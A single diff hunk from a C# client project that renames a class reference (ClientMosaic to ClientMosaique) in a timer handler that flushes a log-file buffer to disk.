@@ -236,7 +236,7 @@ namespace Client.Controllers.Tools
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0 && !ClientMosaic.EXITING)
+            if (_logFileBuffer.Length > 0 && !ClientMosaique.EXITING)
                 WriteFile();
         }
 
